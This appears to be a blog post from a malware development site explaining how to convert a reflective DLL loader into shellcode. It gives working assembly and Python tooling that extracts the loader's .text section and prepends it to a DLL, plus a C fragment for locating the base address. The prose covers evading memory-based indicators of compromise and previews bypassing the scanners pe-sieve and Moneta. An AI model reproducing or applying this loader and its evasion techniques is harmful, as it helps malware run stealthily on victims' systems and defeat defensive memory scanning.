# https://oblivion-malware.xyz/posts/shellcode-reflective-dll-injection/

<!DOCTYPE html><html lang="en"><body><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">shellcode Reflective DLL Injection</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h1 id="steps">Steps</h1><ul><li>Transforming Reflective Loader for PIC code</li><li>Extract text section from Reflective Loader</li><li>Attach Reflective Loader shellcode before PE</li></ul><h2 id="transforming-reflective-loader-for-pic"><span class="me-2">Transforming Reflective Loader for PIC</span><a href="https://oblivion-malware.xyz/posts/shellcode-reflective-dll-injection/#transforming-reflective-loader-for-pic" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We need to do the same as we did in … and …, we will use the Stack alignment as “main” to call our Reflective Function.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>section .text

extern OblivLdr

WinMain:                         
    push rsi                      
    mov  rsi, rsp                 
    and  rsp, 0xFFFFFFFFFFFFFFF0  
    sub  rsp, 0x20                
    call ReflectiveLdr                     
    mov  rsp, rsi                 
    pop  rsi                      
    ret        
</pre></td></tr></tbody></table></code></div></div><h2 id="extract-text-section-from-reflective-loader"><span class="me-2">Extract text section from Reflective Loader</span><a href="https://oblivion-malware.xyz/posts/shellcode-reflective-dll-injection/#extract-text-section-from-reflective-loader" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I will use the same python script that was used in the … serie, to extract the text section</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
# -*- coding:utf-8 -*-
</span>
<span class="kn">import</span> <span class="n">pefile</span>
<span class="kn">import</span> <span class="n">argparse</span>

<span class="c1"># Credits: https://github.com/Cracked5pider
</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>

        <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span> <span class="n">description</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Extracts shellcode from a PE.</span><span class="sh">'</span> <span class="p">)</span>
        <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span> <span class="sh">'</span><span class="s">-f</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span> <span class="o">=</span> <span class="bp">True</span><span class="p">,</span> <span class="nb">help</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Path to the source executable</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span> <span class="o">=</span> <span class="nb">str</span> <span class="p">)</span>
        <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span> <span class="sh">'</span><span class="s">-o</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span> <span class="o">=</span> <span class="bp">True</span><span class="p">,</span> <span class="nb">help</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Path to store the output raw binary</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span> <span class="o">=</span> <span class="nb">str</span> <span class="p">)</span>
        <span class="n">option</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>

        <span class="n">PeExe</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="nc">PE</span><span class="p">(</span> <span class="n">option</span><span class="p">.</span><span class="n">f</span> <span class="p">)</span>
        <span class="nb">file</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span> <span class="n">option</span><span class="p">.</span><span class="n">o</span><span class="p">,</span> <span class="sh">'</span><span class="s">wb+</span><span class="sh">'</span> <span class="p">)</span>

        <span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="n">PeExe</span><span class="p">.</span><span class="n">sections</span><span class="p">:</span>

            <span class="k">if</span> <span class="n">section</span><span class="p">.</span><span class="n">Name</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">''</span> <span class="p">).</span><span class="nf">decode</span><span class="p">(</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span> <span class="p">)</span> <span class="o">==</span> <span class="sh">"</span><span class="s">.text</span><span class="sh">"</span><span class="p">:</span>
                
                <span class="nf">print</span><span class="p">(</span> <span class="sa">f</span><span class="sh">"</span><span class="s">[*] found shellcode [size: </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">section</span><span class="p">.</span><span class="nf">get_data</span><span class="p">())</span><span class="si">}</span><span class="s"> bytes]</span><span class="sh">"</span> <span class="p">)</span>


                <span class="nb">file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span> <span class="n">section</span><span class="p">.</span><span class="nf">get_data</span><span class="p">()</span> <span class="p">)</span>

                <span class="k">break</span>

        <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span> <span class="sh">'</span><span class="s">[!] error: {}</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span> <span class="n">e</span> <span class="p">)</span> <span class="p">)</span>

    <span class="k">return</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="ow">in</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div><h2 id="attach-reflective-loader-shellcode-before-the-pe"><span class="me-2">Attach Reflective Loader shellcode before the PE</span><a href="https://oblivion-malware.xyz/posts/shellcode-reflective-dll-injection/#attach-reflective-loader-shellcode-before-the-pe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The Python script was changed to receive the Reflective Loader and the DLL and thus generate an output with the dll’s shellcode</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="n">argparse</span>
<span class="kn">import</span> <span class="n">pefile</span>

<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">rb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
        <span class="k">return</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">write_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
        <span class="nb">file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">extract_text_section</span><span class="p">(</span><span class="n">pe_path</span><span class="p">):</span>
    <span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="nc">PE</span><span class="p">(</span><span class="n">pe_path</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">section</span> <span class="ow">in</span> <span class="n">pe</span><span class="p">.</span><span class="n">sections</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">section</span><span class="p">.</span><span class="n">Name</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">''</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span> <span class="o">==</span> <span class="sh">"</span><span class="s">.text</span><span class="sh">"</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Found .text section [size: </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">section</span><span class="p">.</span><span class="nf">get_data</span><span class="p">())</span><span class="si">}</span><span class="s"> bytes]</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">section</span><span class="p">.</span><span class="nf">get_data</span><span class="p">()</span>
    <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">No .text section found in the PE file.</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">insert_data_into_pe</span><span class="p">(</span><span class="n">bin_data</span><span class="p">,</span> <span class="n">pe_path</span><span class="p">,</span> <span class="n">output_path</span><span class="p">):</span>
    <span class="n">pe_data</span> <span class="o">=</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">pe_path</span><span class="p">)</span>
    <span class="n">new_data</span> <span class="o">=</span> <span class="n">bin_data</span> <span class="o">+</span> <span class="n">pe_data</span>
    <span class="nf">write_file</span><span class="p">(</span><span class="n">output_path</span><span class="p">,</span> <span class="n">new_data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Insert the .text section of a source PE file into the beginning of a destination PE file.</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-r</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--reflectiveldr</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="nb">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Path to the source PE file</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-d</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--dll</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="nb">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Path to the destination PE file</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-o</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--output</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="nb">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Path to the output PE file</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">text_section_data</span> <span class="o">=</span> <span class="nf">extract_text_section</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">reflectiveldr</span><span class="p">)</span>
        <span class="nf">insert_data_into_pe</span><span class="p">(</span><span class="n">text_section_data</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">output</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Successfully inserted .text section into </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">output</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div><hr><p>We have a problem to solve. The way we were using to find the base address will no longer work as the PE will not be on top of the allocated memory. Instead, our reflective function will occupy this position. Therefore, we need to change the approach.</p><p>I decided to get the return address via the reflective function. With this, we will be able to determine the base address, which will be the beginning of stack alignment. From there, we will add up the size of our shellcode.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="n">BOOL</span> <span class="nf">ReflectiveLdr</span><span class="p">(</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span> <span class="p">)</span> <span class="p">{</span>

    <span class="n">LPVOID</span>    <span class="n">DllAddr</span>  <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">DWORD</span>     <span class="n">dwOffset</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>

	<span class="n">ULONG_PTR</span> <span class="n">LibAddr</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>

    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span><span class="s">"mov %0, rax"</span>   <span class="o">:</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">LibAddr</span><span class="p">));</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span><span class="s">"add %0, 0x800"</span> <span class="o">:</span> <span class="s">"+r"</span> <span class="p">(</span><span class="n">LibAddr</span><span class="p">));</span>
    
    <span class="c1">//...rest of the code...</span>
</pre></td></tr></tbody></table></code></div></div><h1 id="observations">Observations</h1><p>I will compile a DLL that executes a MessageBox just for a brief explanation. We have a problem regarding Indicators of Compromise (IOCs) in memory in relation to the DLL shellcode. It will still have PE magic bytes, section names, and all PE data. I will show how it looks in a hexadecimal editor called ImHex.</p><p></p><p>You may think “I can simply encrypt the shellcode” this idea will not be as effective because to execute the shellcode it would be decrypted and could be caught at runtime easily by memory scans. We also cannot delete all information from the PE because we need specific information from the header to parse and execute reflective loading. What we can do is replace only data that we are not using, which are as follows</p><p> Source image: <a href="https://securityintelligence.com/x-force/defining-cobalt-strike-reflective-loader/">x-force/defining-cobalt-strike-reflective-loader</a></p><p>You can use other approaches like stomping/overloading to support the memory and we also apply a memory analysis evasion technique, in the next articles I will address this topic and bypass memory scans such as pe-sieve and moneta.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="https://oblivion-malware.xyz/categories/malware-development/">Malware Development</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 "><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=shellcode%20Reflective%20DLL%20Injection%20-%20Oblivion&amp;url=%2Fposts%2Fshellcode-reflective-dll-injection%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Twitter" data-bs-original-title="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=shellcode%20Reflective%20DLL%20Injection%20-%20Oblivion&amp;u=%2Fposts%2Fshellcode-reflective-dll-injection%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Facebook" data-bs-original-title="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fshellcode-reflective-dll-injection%2F&amp;text=shellcode%20Reflective%20DLL%20Injection%20-%20Oblivion" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Telegram" data-bs-original-title="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" data-title-succeed="Link copied successfully!" data-bs-original-title="Copy link"> <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="https://oblivion-malware.xyz/tags/windows/">Windows</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>
</body></html>